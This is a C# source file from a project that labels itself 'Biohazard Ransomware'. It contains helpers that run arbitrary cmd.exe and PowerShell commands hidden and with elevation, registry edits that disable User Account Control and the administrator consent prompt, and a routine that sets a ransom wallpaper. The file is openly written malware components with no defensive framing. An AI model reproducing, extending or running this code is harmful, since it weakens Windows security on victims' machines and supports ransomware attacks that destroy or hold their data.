using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Biohazard.SetWallpaper;

namespace Biohazard.CommandLine
{
    class BiohazardCommandLine
    {
        public void CMDLine(string cmdline)
        {
            ProcessStartInfo proc = new ProcessStartInfo();
            proc.FileName = "cmd.exe";
            proc.WindowStyle = ProcessWindowStyle.Hidden;
            proc.Arguments = $"/c {cmdline}";
            proc.Verb = "runas";
            proc.CreateNoWindow = true;
            Process.Start(proc);
        }
    }
}
namespace Biohazard.PowerShellCommandLine
{
    class BioPowershell
    {
        public void PowerShellCMDLine(string pscommand)
        {
            ProcessStartInfo powershell = new ProcessStartInfo();
            powershell.FileName = "powershell";
            powershell.WindowStyle = ProcessWindowStyle.Hidden;
            powershell.Arguments = $"{pscommand}";
            powershell.Verb = "runas";
            powershell.CreateNoWindow = true;
            Process.Start(powershell);
        }

    }
}
namespace Biohazard.RegistryEdit
{
    class RegEditor
    {
        public void DisableLUA()
        {
            try
            {
                string locmachine = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System";
                var key = Registry.LocalMachine.OpenSubKey(locmachine, true);
                key.DeleteValue("EnableLUA");
                key.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
            }
            catch { }
        }
        public void NoAdminRequiredLUA()
        {
          try
          {
                string localmachinesoftware = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System";
                var hkey = Registry.LocalMachine.OpenSubKey(localmachinesoftware, true);
                hkey.DeleteValue("ConsentPromptBehaviorAdmin");
                hkey.SetValue("ConsentPromptBehaviorAdmin", "0", RegistryValueKind.DWord);
          }
            catch (Exception ex)
          {
                string error = ex.Message;
                MessageBox.Show(error, "Biohazard Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Error);
          }

        }
    }
}

namespace Biohazard.ChangeWallpaper
{
    class BIOWallpaper
    {
        public void ChangeWallpaper()
        {
            BiohazardWallPaper bio = new BiohazardWallPaper();
            bio.SetWallpaper(@"C:\Temp\BiohazardRans.jpg");
        }
    }
}
